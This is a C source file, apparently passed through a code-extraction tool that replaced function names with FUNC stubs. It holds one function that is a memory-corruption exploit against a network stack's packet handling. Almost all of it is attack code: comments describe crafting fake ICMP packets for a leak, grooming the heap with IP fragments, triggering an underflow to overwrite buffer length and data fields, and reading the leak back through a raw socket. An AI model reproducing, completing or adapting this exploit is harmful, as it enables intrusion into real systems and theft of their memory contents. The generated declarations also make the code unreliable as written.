#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  zero ;
typedef  int u_int32_t ;
struct iphdr {size_t tot_len; size_t id; int /*<<< orphan*/  frag_off; } ;
struct icmphdr {int dummy; } ;

/* Variables and functions */
 int /*<<< orphan*/  DST_ADDR ; 
 size_t ETH_HDRLEN ; 
 int /*<<< orphan*/  ETH_P_ALL ; 
 size_t ICMP_HDRLEN ; 
 size_t IP4_HDRLEN ; 
 int /*<<< orphan*/  IPPROTO_ICMP ; 
 int /*<<< orphan*/  IP_MAXPACKET ; 
 int IP_MF ; 
 char* FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  PF_PACKET ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int /*<<< orphan*/  SRC_ADDR ; 
 int /*<<< orphan*/  FUNC1 (void*,int,char*,int,int) ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 void* heap_leak ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (struct icmphdr*,int /*<<< orphan*/ *,int) ; 
 int FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (struct iphdr*,int,int,size_t,int /*<<< orphan*/ ,size_t,int) ; 
 int /*<<< orphan*/  FUNC8 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC9 (char*,int,int /*<<< orphan*/ ) ; 
 size_t FUNC10 (size_t) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 
 int FUNC12 () ; 
 int /*<<< orphan*/  FUNC13 () ; 
 int /*<<< orphan*/  recv_socket ; 
 int /*<<< orphan*/  FUNC14 (size_t,int,char*,int) ; 
 int /*<<< orphan*/  FUNC15 (char*,int) ; 
 int /*<<< orphan*/  FUNC16 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC17 (int,int) ; 
 int spray_id ; 

void FUNC18() {
    u_int32_t src_addr, dst_addr;
    src_addr = FUNC6(SRC_ADDR);
    dst_addr = FUNC6(DST_ADDR);

    /* Crafting Fake ICMP Packet For Leak */
    char * pkt = FUNC0(IP_MAXPACKET);
    struct iphdr * ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
    struct icmphdr * icmp = (struct icmphdr * )(pkt+ETH_HDRLEN+IP4_HDRLEN);
    FUNC3(pkt);
    FUNC7(ip,src_addr,dst_addr,ICMP_HDRLEN,IPPROTO_ICMP,0xbabe,IP_MF);

    ip->tot_len = FUNC10(ip->tot_len) - IP4_HDRLEN;
    ip->id = FUNC10(ip->id);
    ip->frag_off = FUNC4(ip->frag_off);

    FUNC5(icmp,NULL,0x0);
    char * data = (char *)icmp + ICMP_HDRLEN + 8;
    size_t pkt_len = ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN;

    spray_id = FUNC12() & 0xffff;
    FUNC1((void * )(0xb00-0x20),3,pkt,pkt_len+4,0x100);

    // This is same as the arbitrary write function
    spray_id = FUNC12() & 0xffff;
    FUNC17(0x8, 0x20);
    size_t id = spray_id + 0x20;

    size_t replay_id = id++;
    FUNC14(replay_id, 0x100, NULL, IP_MF);

    // Target
    size_t target_id = id++;
    FUNC14(target_id, 0x8, NULL, IP_MF);

   
    // Padding
    FUNC14(id++, 0x8, NULL, IP_MF);
    FUNC14(id++, 0x8, NULL, IP_MF);

    // Piviot Point
    size_t hole_1 = id++;
    FUNC14(hole_1, 0x8, NULL, IP_MF);


    // Padding
    FUNC14(id++, 0xC30, NULL, IP_MF);

    // For creating hole
    size_t hole_2 = id++;
    FUNC14(hole_2, 0x8, NULL, IP_MF);

    // Prevent Consolidation
    FUNC14(id++, 0x8, NULL, IP_MF);

    // This should create the fist hole
    FUNC14(hole_1, 0x8, NULL, 0x1);

    // This should create the second hole
    FUNC14(hole_2, 0x8, NULL, 0x1);

    // Trigger the bug to change target's m_len
    int m_data_off = -0xd50;
    int m_len = m_data_off;
    size_t * addr = (size_t * )(0xb00 - 0x20 + ETH_HDRLEN + 0xe +  6) ;
    size_t addrlen = 0x3;

    if (addrlen != 0x8) {
      m_len -= (0x8 - addrlen);
    }

    size_t vuln_id = id++;

    FUNC9(pkt,0x0,IP_MAXPACKET);
    ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
    FUNC3(pkt);

    pkt_len = 0xc90;
    FUNC7(ip,m_len,0x0,pkt_len,IPPROTO_ICMP,vuln_id,IP_MF);
    u_int32_t frame_length = ETH_HDRLEN + IP4_HDRLEN + pkt_len;
    FUNC15(pkt,frame_length);

    
    FUNC9(pkt,0x0,IP_MAXPACKET);
    ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
    FUNC3(pkt);
    pkt_len = 0x8;
    FUNC7(ip,m_len,0x0,pkt_len,IPPROTO_ICMP,vuln_id,0x192);
    frame_length = ETH_HDRLEN + IP4_HDRLEN + pkt_len;
    FUNC15(pkt,frame_length);


    // Underflow and write to change m_data
    char addr_buf[0x8] = {0};
    if (addrlen != 0x8) {
      FUNC8(&addr_buf[(0x8-addrlen)],(char *)&addr,addrlen);
    } else {
      FUNC8(addr_buf,(char *)&addr,8);
    }
    FUNC14(target_id, 0x8, addr_buf, 0x1);

  if ((recv_socket = FUNC16(PF_PACKET, SOCK_RAW, FUNC4(ETH_P_ALL))) < 0)
      FUNC2("socket() failed to obtain a receive socket descriptor");
    FUNC14(replay_id, 0x8, NULL, 0x20);
    FUNC13();


    char zero[0x28] = {0};
    spray_id = FUNC12() & 0xffff;
    FUNC11("Cleaning Heap\n");
    FUNC1(heap_leak + (0xb00 - 0x20),3,zero,sizeof(zero),0x20);
}